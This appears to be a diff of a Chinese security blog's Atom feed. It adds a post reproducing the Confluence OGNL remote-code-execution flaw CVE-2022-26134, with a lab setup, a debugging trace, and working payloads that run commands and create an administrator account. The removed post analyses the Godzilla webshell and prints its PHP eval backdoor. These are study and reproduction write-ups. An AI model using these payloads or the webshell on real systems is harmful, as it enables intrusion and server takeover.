@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2022-07-15T21:19:16.698Z</updated>
+  <updated>2022-08-12T16:31:03.283Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2022-26134 Confluence OGNL RCE 漏洞复现</title>
+    <link href="http://422926799.github.io/posts/9c6a5f14.html"/>
+    <id>http://422926799.github.io/posts/9c6a5f14.html</id>
+    <published>2022-08-12T16:12:54.000Z</published>
+    <updated>2022-08-12T16:31:03.283Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>Confluence Server and Data Center &gt;= 1.3.0<br>Confluence Server and Data Center &lt; 7.4.17<br>Confluence Server and Data Center &lt; 7.13.7<br>Confluence Server and Data Center &lt; 7.14.3<br>Confluence Server and Data Center &lt; 7.15.2<br>Confluence Server and Data Center &lt; 7.16.4<br>Confluence Server and Data Center &lt; 7.17.4<br>Confluence Server and Data Center &lt; 7.18.1</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境</p><pre><code>docker-compose.ymlversion: &#39;2&#39;services:  web:    image: vulhub/confluence:7.13.6    ports:      - &quot;8090:8090&quot;      - &quot;5050:5050&quot;    depends_on:      - db  db:    image: postgres:12.8-alpine    environment:    - POSTGRES_PASSWORD=postgres    - POSTGRES_DB=confluence</code></pre><p>docker搭好后<br><img src="https://s1.ax1x.com/2022/08/13/vY5EOU.png" alt=""></p><p>搭建好之后还需要去注册账号获取临时KEY来激活<br>参考链接：<a href="https://www.modb.pro/db/431731" target="_blank" rel="noopener">https://www.modb.pro/db/431731</a></p><p>安装过程<br><img src="https://s1.ax1x.com/2022/08/13/vY5KYR.png" alt=""></p><p>安装成功后<br><img src="https://s1.ax1x.com/2022/08/13/vY52kj.png" alt=""></p><p>在容器中/opt/atlassian/confluence/bin目录下修改setenv.sh文件，加入远程调试配置。</p><pre><code>CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050 ${CATALINA_OPTS}&quot;</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vY5Whn.png" alt=""></p><p>进入容器后将/opt/atlassian目录下的confluence源码使用docker cp命令复制到本地。<br>使用IDEA将/confluence/WEB-INF下的atlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件拉取为依赖文件<br><img src="https://s1.ax1x.com/2022/08/13/vY5410.png" alt=""></p><p>idea远程调试设置<br><img src="https://s1.ax1x.com/2022/08/13/vY55cV.png" alt=""></p><p>之后在com/opensymphony/webwork/dispatcher/ServletDispatcher.class第85行下断点(service函数)<br><img src="https://s1.ax1x.com/2022/08/13/vY5TnU.png" alt=""></p><p>为什么在ServletDispatcher下断点？运维所有的.action最后的servlet指向了，com.atlassian.confluence.servlet.ConfluenceServletDispatcher类，而ConfluenceServletDispatcher继承了ServletDispatcher<br><img src="https://s1.ax1x.com/2022/08/13/vY5qAJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/08/13/vY5v1x.png" alt=""></p><h2 id="动态调试过程"><a href="#动态调试过程" class="headerlink" title="动态调试过程"></a>动态调试过程</h2><p>1.com/opensymphony/webwork/dispatcher/ServletDispatcher调用com/atlassian/confluence/servlet/ConfluenceServletDispatcher.classserviceAction函数<br><img src="https://s1.ax1x.com/2022/08/13/vY5zjK.png" alt=""></p><p>2.创建一个hash表把传进的全部作为hash表默认值，变量名为extraContext<br>3.put变量名为com.opensymphony.xwork.dispatcher.ServletDispatcher，值是自身对象<br>4.调用DefaultActionProxy里的createActionProxy传入namespace，actionName,extraContext 变量名为proxy<br>5.调用proxy的execute函数<br><img src="https://s1.ax1x.com/2022/08/13/vYICHe.png" alt=""><br><img src="https://s1.ax1x.com/2022/08/13/vYIFNd.png" alt=""></p><p>DefaultActionProxy里的execute函数<br>1.获取ActionContext对象实例 （DefaultActioninvocation）<br>2.调用该对象的invoke函数<br><img src="https://s1.ax1x.com/2022/08/13/vYIk4A.png" alt=""></p><p>DefaultActioninvocation invoke函数<br>1.遍历this.interceptors.hasNext() hash表 （该hash表存着所有类对象）<br>2.当resultCode为notpermitted时，退出循环<br><img src="https://s1.ax1x.com/2022/08/13/vYIZgP.png" alt=""></p><p>6.进入到ActionChainResult类里的execute函数<br>7.this.namespace为我们传入的payload<br>8.OgnlValueStack stack变量获取OgnlValueStack对象<br>9.将stack和this.namespace传入TextParseUtil.translateVariables函数<br><img src="https://s1.ax1x.com/2022/08/13/vYI14s.png" alt=""></p><p>translateVariables函数<br>1.正则提取ONGL表达式<br>2.调用OgnlValueStack.findValue函数传入ONGL表达式 复制变量object o<br>3.执行完后返回内容<br><img src="https://s1.ax1x.com/2022/08/13/vYI8Cn.png" alt=""></p><p>OgnlValueStack.findValue函数<br>最后调用findValue函数对表达式进行解析<br><img src="https://s1.ax1x.com/2022/08/13/vYIJg0.png" alt=""><br>(不知道是不是远程调试的问题，这里断点o没返回执行命令的结果，文章里有）<br><img src="https://s1.ax1x.com/2022/08/13/vYIwE4.png" alt=""></p><h2 id="payload刨析"><a href="#payload刨析" class="headerlink" title="payload刨析"></a>payload刨析</h2><pre><code>GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: 192.168.3.88:8090Cache-Control: max-age=0DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=EA0CD27EDE8E10DD40A744E51514CB5FConnection: close</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vYIygx.png" alt=""></p><p>payload刨析<br>1.定义a变量调用Runtime.exec执行命令<br>2.将执行命令结果设置到返回头X-Cmd-Response</p><pre><code>//${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/</code></pre><p>出处Y4er的博客 <a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a><br>添加用户的payload</p><pre><code>${#this.getUserAccessor().addUser(&#39;test&#39;,&#39;test@1234&#39;,&#39;test@gmail.com&#39;,&#39;Test&#39;,@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(&quot;confluence-administrators,confluence-users&quot;))}</code></pre><p>设置cookie payload</p><pre><code>${@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)}</code></pre><p>EXP<br><a href="https://github.com/Nwqda/CVE-2022-26134" target="_blank" rel="noopener">https://github.com/Nwqda/CVE-2022-26134</a><br><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL" target="_blank" rel="noopener">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/335624.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/335624.html</a><br><a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞范围&quot;&gt;&lt;a href=&quot;#漏洞范围&quot; class=&quot;headerlink&quot; title=&quot;漏洞范围&quot;&gt;&lt;/a&gt;漏洞范围&lt;/h2&gt;&lt;p&gt;Confluence Server and Data Center &amp;gt;= 1.3.0&lt;br&gt;Confluence Se</summary>
+      
+    
+    
+    
+    
+    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
+    
+  </entry>
   
   <entry>
     <title>iscsicpl.exe ByPassUac复现</title>
@@ -433,29 +455,6 @@
       
     <summary type="html">&lt;p&gt;哥斯拉version:1.0&lt;br&gt;Cryption:PHP_XOR_BASE64&lt;br&gt;这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;* 先获取对于payload类型，然后从</summary>
-      
-    
-    
-    
-    
-    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>哥斯拉整体过程刨析</title>
-    <link href="http://422926799.github.io/posts/befc239e.html"/>
-    <id>http://422926799.github.io/posts/befc239e.html</id>
-    <published>2021-09-03T13:27:25.000Z</published>
-    <updated>2021-09-03T19:05:54.125Z</updated>
-    
-    <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;本文主要是分析哥斯拉流量协议实现的过程&lt;/p&gt;
-&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;版本:v1.0&lt;br&gt;有效荷载:Phpdynxxxxx&lt;br&gt;加密器:php_xor_</summary>
       
     
     
